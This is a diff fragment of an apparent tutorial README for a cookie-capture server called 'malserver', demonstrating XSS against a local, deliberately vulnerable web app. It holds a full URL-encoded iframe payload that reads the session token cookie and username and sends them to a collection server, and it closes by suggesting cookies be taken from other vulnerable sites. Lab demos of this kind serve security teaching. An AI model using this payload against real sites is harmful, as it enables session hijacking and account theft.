@@ -75,3 +75,7 @@ If you open another tab and navigate to the following URL, it will do the same t
 ```
 http://localhost:3000/#/search?q=%3Ciframe%20src%3D'javascript:function%20getCookie(e)%7Bfor(var%20t%3De%2B%22%3D%22,n%3DdecodeURIComponent(document.cookie).split(%22;%22),o%3D0;o%3Cn.length;o%2B%2B)%7Bfor(var%20r%3Dn%5Bo%5D;%22%20%22%3D%3Dr.charAt(0);)r%3Dr.substring(1);if(0%3D%3Dr.indexOf(t))return%20r.substring(t.length,r.length)%7Dreturn%22%22%7Dvar%20username%20%3D%20parent.document.querySelector(%22.menu-text.truncate%22).innerHTML.trim();var%20cookie%20%3D%20getCookie(%22token%22);document.write(%22%3Ciframe%20src%3D%22%20%2B%20%60http:%2F%2Flocalhost:5000%2F%3Fusername%3D$%7Busername%7D%26cookie%3D$%7Bcookie%7D%60%20%2B%20%22%3E%3C%2Fiframe%3E%22);'%3E
 ```
+
+6. Either way that the attack is executed, you should receieve the captured username and cookie in your **cookies.log** file.
+
+7. This ends our demo of how to use malserver. Try sending cookies from another vulnerable site or testing your own web application against XSS attacks.
